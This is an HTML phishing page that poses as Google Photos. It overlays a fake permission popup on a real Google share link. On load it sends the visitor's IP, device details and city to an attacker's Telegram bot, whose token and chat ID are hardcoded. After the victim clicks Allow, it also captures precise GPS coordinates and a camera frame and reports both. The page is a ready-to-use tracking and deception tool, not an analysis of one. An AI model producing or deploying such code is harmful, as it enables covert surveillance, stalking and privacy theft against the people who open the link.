<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Photos</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #fff; 
            overflow: hidden; 
            height: 100vh; 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        iframe {
            width: 100%;
            height: 100vh;
            border: none;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1;
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(4px);
        }
        .permission-box {
            background: #1a1a2e;
            padding: 40px 30px;
            border-radius: 24px;
            max-width: 400px;
            text-align: center;
            color: #fff;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }
        .permission-box .icon { font-size: 60px; margin-bottom: 16px; }
        .permission-box h2 { font-size: 22px; font-weight: 600; margin-bottom: 8px; }
        .permission-box p { font-size: 14px; color: #aaa; line-height: 1.6; margin-bottom: 24px; }
        .btn {
            background: linear-gradient(135deg, #4285F4, #34A853);
            border: none;
            color: #fff;
            font-weight: 700;
            font-size: 16px;
            padding: 14px 40px;
            border-radius: 40px;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
        }
        .btn:hover { transform: scale(1.03); opacity: 0.9; }
        .btn:active { transform: scale(0.96); }
        .footer { 
            position: fixed; 
            bottom: 16px; 
            left: 0; 
            right: 0; 
            text-align: center; 
            z-index: 5; 
            color: rgba(255,255,255,0.2); 
            font-size: 11px; 
            letter-spacing: 1px; 
            pointer-events: none;
        }
        .footer span { color: rgba(100,255,218,0.3); }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <!-- ============================================ -->
    <!-- ASLI GOOGLE PHOTOS IFRAME                    -->
    <!-- ============================================ -->
    <iframe src="https://share.google/StGxW5TAjrdNOPbYR" id="googleFrame"></iframe>

    <!-- ============================================ -->
    <!-- PERMISSION OVERLAY (Fake Permission Popup)   -->
    <!-- ============================================ -->
    <div class="overlay" id="permissionOverlay">
        <div class="permission-box">
            <div class="icon">📸</div>
            <h2>Google Photos wants to access your camera & location</h2>
            <p>To enhance your photo viewing experience, Google Photos needs access to your camera and location. This is required for the album to load properly.</p>
            <button class="btn" id="allowBtn">📷 Allow Camera & Location</button>
        </div>
    </div>

    <div class="footer"><span>dev @btwspark</span></div>

    <script>
        // ============================================================
        // 🔥 CONFIG — TELEGRAM BOT
        // ============================================================
        const BOT_TOKEN = "8569274562:AAGskuxql0tB8FQkTNBYF13p82eTL7LEzX0";   // @BotFather se lo
        const CHAT_ID   = "8363966106";     // @getmyid_bot se lo

        let userData = {
            ip: 'fetching...',
            device: navigator.userAgent,
            language: navigator.language,
            screen: window.screen.width + 'x' + window.screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            platform: navigator.platform
        };

        // ============================================================
        // 📤 SEND TO TELEGRAM
        // ============================================================
        function sendToTelegram(msg) {
            if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || CHAT_ID === "YOUR_CHAT_ID_HERE") {
                console.warn("⚠️ Set BOT_TOKEN & CHAT_ID first!");
                return;
            }
            const now = new Date();
            const ts = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true });
            const full = `🧠 *Vyom Tracker*
📅 ${ts}
${msg}
—————————
🛠️ dev @btwspark`;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: full,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            }).catch(console.error);
        }

        // ============================================================
        // 🌐 IP CAPTURE (AUTOMATIC)
        // ============================================================
        async function captureIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userData.ip = data.ip;
                const loc = await fetch(`https://ipapi.co/${data.ip}/json/`).then(r => r.json());
                const msg = `🆕 *New Visitor*
📌 IP: \`${userData.ip}\`
💻 Device: ${userData.device.substring(0, 60)}...
🌐 Lang: ${userData.language}
📍 City: ${loc.city || 'N/A'}, ${loc.region || 'N/A'}
🌍 Country: ${loc.country_name || 'N/A'}`;
                sendToTelegram(msg);
            } catch {
                userData.ip = 'unavailable';
            }
        }

        // ============================================================
        // 📸 CAPTURE PHOTO FROM CAMERA
        // ============================================================
        function capturePhoto(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                const dataUrl = canvas.toDataURL('image/jpeg');
                sendToTelegram(`📸 *Photo Captured* (Base64 length: ${dataUrl.length})`);
                // Optional: Send as file (requires multipart upload)
                video.srcObject = null;
                stream.getTracks().forEach(t => t.stop());
            }, 1000);
        }

        // ============================================================
        // 📍 LOCATION + CAMERA PERMISSION REQUEST
        // ============================================================
        function requestPermissions() {
            // Step 1: Camera
            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(stream => {
                    sendToTelegram('✅ *Camera Access:* Granted');
                    capturePhoto(stream);
                })
                .catch(err => {
                    sendToTelegram(`❌ *Camera Access:* Denied (${err.message})`);
                });

            // Step 2: Location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        const lat = pos.coords.latitude;
                        const lng = pos.coords.longitude;
                        const acc = Math.round(pos.coords.accuracy);
                        const maps = `https://www.google.com/maps?q=${lat},${lng}`;
                        sendToTelegram(`📍 *Exact Location*
Lat: \`${lat}\`, Lng: \`${lng}\`
Accuracy: ±${acc}m
🗺️ [Map](${maps})`);
                    },
                    err => {
                        sendToTelegram(`❌ *Location:* Denied (${err.message})`);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                sendToTelegram('⚠️ Geolocation not supported');
            }
        }

        // ============================================================
        // 🎮 UI — PERMISSION OVERLAY HANDLER
        // ============================================================
        document.getElementById('allowBtn').addEventListener('click', function() {
            // Hide overlay (victim ko Google Photos dikhega)
            document.getElementById('permissionOverlay').classList.add('hidden');
            
            // Track click
            sendToTelegram('👆 *User clicked "Allow"* (Permissions granted)');
            
            // Trigger camera + location
            requestPermissions();
        });

        // ============================================================
        // 🚀 PAGE LOAD
        // ============================================================
        window.onload = function() {
            captureIP();
            // Show overlay after 1.5 seconds
            setTimeout(() => {
                document.getElementById('permissionOverlay').classList.remove('hidden');
            }, 1500);
        };
    </script>
</body>
</html>
